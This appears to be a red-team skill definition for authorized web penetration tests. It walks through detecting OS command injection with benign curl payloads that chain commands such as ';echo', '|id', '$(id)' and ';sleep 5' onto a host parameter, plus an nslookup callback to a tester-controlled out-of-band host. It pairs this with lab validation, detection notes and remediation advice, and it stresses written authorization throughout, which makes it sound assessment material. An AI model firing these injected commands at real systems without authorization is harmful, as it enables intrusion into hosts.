---
name: web-command-injection
description: >-
  Confirm and safely demonstrate OS command injection in a web application
  during an authorized assessment. Use when user-controlled input may reach a
  shell, system(), or subprocess call and you need to prove code execution and
  its blast radius without harming the host.
version: 1.0.0
team: red
app_type: web-app
killchain:
  framework: mitre-attack
  stage: initial-access
techniques:
  attack: [T1190, T1059]
  capec: [CAPEC-248]
  cwe: [CWE-78]
  owasp: ["A03:2021"]
  d3fend: []
pairs_with: [web-command-injection-detection]
risk:
  level: critical
  reversible: false
  data_touch: read-write
authorization: required
maturity: validated
validation:
  method: lab
  target: owasp-juice-shop
  last_validated: 2026-07-28
  validated_by: praneeth132006
license: Apache-2.0
---

# Web OS command injection

## Overview

OS command injection occurs when untrusted input is passed to a shell or process
invocation without neutralization, letting an attacker run arbitrary commands in
the application's context. This skill takes a candidate parameter and walks from
detection → out-of-band confirmation → minimal, non-destructive proof of
execution. It favours safe markers (echo of a random token, controlled `sleep`,
DNS/HTTP callbacks) over destructive commands.

## Authorization & scope

**Run only against systems you are explicitly authorized to test.** Before acting,
confirm:

- The target host/URL is inside the engagement's written scope.
- Authorization (SOW, rules of engagement, or bug-bounty policy) is on file and
  the testing window is open.
- You will avoid commands that modify, delete, or exfiltrate host data. Prove
  execution with a benign token or timing, not with `rm`, `curl | sh`, reverse
  shells, or reading real secrets.

Command injection is **critical and often irreversible** (it can crash or alter
the host). Stop and report immediately if a payload has an unexpected side effect.

## Preconditions

- An input that plausibly reaches a command: filenames, `ping`/`nslookup`/export
  features, image/PDF processing, `host=`/`ip=` style parameters, webhook URLs.
- Ability to observe responses (body, status, timing) and, ideally, an
  out-of-band (OOB) listener you control for blind cases.

## Procedure

1. **Baseline.** Capture the normal response for a benign value.
2. **Inject separators.** Append shell metacharacters and look for changed output
   or errors:
   ```bash
   # command separators / substitution — observe echoed output
   curl -s "https://TARGET/ping?host=127.0.0.1;echo RBSK-$RANDOM"
   curl -s "https://TARGET/ping?host=127.0.0.1|id"
   curl -s "https://TARGET/ping?host=\$(id)"
   ```
3. **Time-based confirmation** when output is not reflected (blind):
   ```bash
   curl -s -o /dev/null -w '%{time_total}\n' "https://TARGET/ping?host=127.0.0.1;sleep 5"
   ```
4. **Out-of-band confirmation** for fully blind sinks — trigger a callback to a
   listener you own (interactsh/Burp Collaborator/your DNS log):
   ```bash
   curl -s "https://TARGET/ping?host=127.0.0.1;nslookup rbsk-$RANDOM.oob.YOURHOST"
   ```
5. **Characterize** the context minimally: current user (`id`/`whoami`), OS
   (`uname -a`), and whether output is returned or blind. Note quoting/filters
   that shaped the payload (argument injection vs full command context).
6. **Prove impact minimally.** A single echoed unique token, one timing proof, or
   one OOB hit is sufficient. Do not pivot, persist, or read sensitive files.
7. **Record** the exact request, the payload that worked, the observed evidence,
   and remediation guidance (avoid shells; use parameterized process APIs with
   argument arrays; strict allow-list validation).

## Paired defense / offense

Pairs with **web-command-injection-detection**. Every step here is detectable:
shell metacharacters in parameters, anomalous child processes spawned by the web
service account, outbound DNS/HTTP from an app tier that shouldn't make them, and
`sleep`-shaped latency. When validating both together, confirm those detections
fire on the traffic and process events you generate.

## Validation

Reproduce against **OWASP Juice Shop** or the `_lab/` DVWA target:

1. Bring up the lab: `cd _lab && docker compose up -d`.
2. On DVWA's *Command Injection* page (low security), submit `127.0.0.1;echo RBSK`
   and confirm the token is reflected in the response.
3. Confirm a `;sleep 5` payload measurably delays the response, proving blind
   execution without touching host data.

## References

- OWASP: OS Command Injection Defense Cheat Sheet
- MITRE ATT&CK T1059 — Command and Scripting Interpreter; T1190
- CWE-78 — Improper Neutralization of Special Elements used in an OS Command
- PortSwigger Web Security Academy — OS command injection
